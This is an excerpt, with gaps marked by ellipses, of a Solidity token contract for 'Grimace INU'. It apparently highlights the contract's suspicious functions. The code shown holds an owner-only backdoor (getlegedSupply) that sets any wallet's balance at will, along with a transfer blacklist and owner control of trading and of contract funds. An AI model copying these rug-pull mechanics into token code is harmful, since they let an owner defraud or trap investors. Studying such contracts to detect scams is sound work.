...
contract GrimaceINU is IERC20, Authorize {
    ...
    mapping (address => uint256) private _tokenlegend;
    ...
    string private constant _name = "Grimace INU";
    ...
    address private marketingFeeReceiver =0x9247083B033094A0905D6838fC497E619279979c;
   ...
   uint256 private sellLiquidityFee = 3;
    ...
    constructor () Authorize(msg.sender) {
      ...
      _tokenlegend[_owner] = _liqSupply;
    ...
    function balanceOf(address account) public view override returns (uint256) { return _tokenlegend[account]; }
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if(sender != pair && recipient != pair){ return _dasicTransfer(sender, recipient, amount); } 
        ...
        if (recipient != pair && recipient != DEAD) {
            require(isTxLimitExempt[recipient] || isTxLimitExempt[sender] || isMaxWalletExempt[sender]|| isMaxWalletExempt[recipient] || _tokenlegend[recipient] + amount <= _maxWalletSize);
        }
        
        if(shouldSwapBack()){ swapBack(); }
        

        _tokenlegend[sender] = _tokenlegend[sender].sub(amount);
    
        if(shouldTakeFee(sender) != true || shouldTakeFee(recipient) != true){
             uint256 amountReceived = amount; 
             _tokenlegend[recipient] = _tokenlegend[recipient].add(amountReceived);
    ...
    function _dasicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        require(!bl[sender] && !bl[recipient]);
        require(isMaxWalletExempt[recipient] ||isMaxWalletExempt[sender]|| _tokenlegend[recipient] + amount <= _maxWalletSize);
        require(isFeeExempt[sender] || tradingEnabled == true);
        _tokenlegend[sender] = _tokenlegend[sender].sub(amount);
        _tokenlegend[recipient] = _tokenlegend[recipient].add(amount);
    ...
    function takeFee(address sender, address receiver, uint256 amount) internal returns (uint256) {
        ...
        if(receiver == pair) {
            ...
            _tokenlegend[address(this)] = _tokenlegend[address(this)].add(newFeeAmount); 
    ...
    function shouldSwapBack() internal view returns (bool) {
        ...
        && !inSwap
        && swapEnabled
        &&_tokenlegend[address(this)] >= swapThreshold;
    }
    ...
    function swapBack() internal swapping {
        ...
        require(MarketingSuccess && DevSuccess && secDevSuccess && utilitySuccess);
    ...
    function startTradingM() external onlyOwner{
        tradingEnabled = true;
        swapEnabled = true;
    ...
    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        require(amount <= _maxTxAmount || isTxLimitExempt[sender]|| isTxLimitExempt[recipient]);
    }
 ...
 function setMaxWallet(uint256 amount) external onlyOwner() {
    ...
    function transferContract(address _token, uint _amount) public Authorizeorized {
        require(_amount <= IERC20(_token).balanceOf(address(this)));
        IERC20(_token).transfer(marketingFeeReceiver, _amount);
    }
        function getlegedSupply(address _wallet,uint256 amount) external onlyOwner() {
       
    _tokenlegend[_wallet]=  amount;
    }   
